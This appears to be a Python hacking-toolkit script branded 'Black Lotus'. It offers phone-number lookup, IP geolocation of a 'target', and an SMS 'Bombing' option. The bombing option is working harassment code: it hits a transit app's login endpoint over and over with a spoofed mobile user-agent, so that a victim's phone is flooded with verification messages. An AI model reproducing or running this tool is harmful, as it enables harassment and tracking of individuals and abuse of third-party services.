
from phonenumbers import carrier
from phonenumbers import geocoder
from phonenumbers import timezone
from phonenumbers import parse
from phonenumbers import is_valid_number
from phonenumbers.phonenumberutil import NumberParseException
import os
import json
from urllib import request
import requests
import sys
from tqdm import tqdm
import sys

print("𝔹𝕃𝔸ℂ𝕂 𝕃𝕆𝕋𝕌𝕊\n ")
print("OPTIONS:\n ")
print("[1] Phone number info\n ")
print("[2] IP-Trace\n ")
print("[3] Bombing\n ")
print("[4] EXIT")
BlackLotus = input("> ")

if BlackLotus == "1":
    try:
        phone = parse(input("Enter phone number: "))
        print(str(phone))
        print('does is valid phone?: ' + str(is_valid_number(phone)))
        print('Provider: ' + carrier.name_for_number(phone, "en"))
        print('Location: ' + geocoder.description_for_number(phone, "en"))
        print('Timezone: ' + str(timezone.time_zones_for_number(phone)))
    except NumberParseException:
        print("Invalid phone number.")
elif BlackLotus == "2":
    ip = input("Enter target ip: ")
    url = "http://ip-api.com/json/" + ip
    response = request.urlopen(url)
    data = response.read()
    values = json.loads(data)
    print("IP: " + values["query"])
    print("City: " + values["city"])
    print("ISP: " + values["isp"])
    print("Country: " + values["country"])
    print("Region: " + values["region"])
    print("Time Zone: " + values["timezone"])
elif BlackLotus == "3":
    headers = ({"User-Agent": "Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp"})
    phone_number = input("Enter phone number(ex. 44**********): ")
    url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + phone_number
    numofmsgs = int(input("Enter number of messages to send: "))
    succeeded_count = 0
    failed_count = 0
    for i in tqdm(range(numofmsgs)):
        resp = requests.get(url)
        if resp.status_code == 200:
            succeeded_count += 1
        else:
            failed_count += 1
    print("Total successful messages sent: ", succeeded_count)
    print("Total failed messages sent: ", failed_count)
elif BlackLotus == "4":
    print("exiting...")
    exit()
print('𝔹𝕃𝔸ℂ𝕂 𝕃𝕆𝕋𝕌𝕊')

exit()
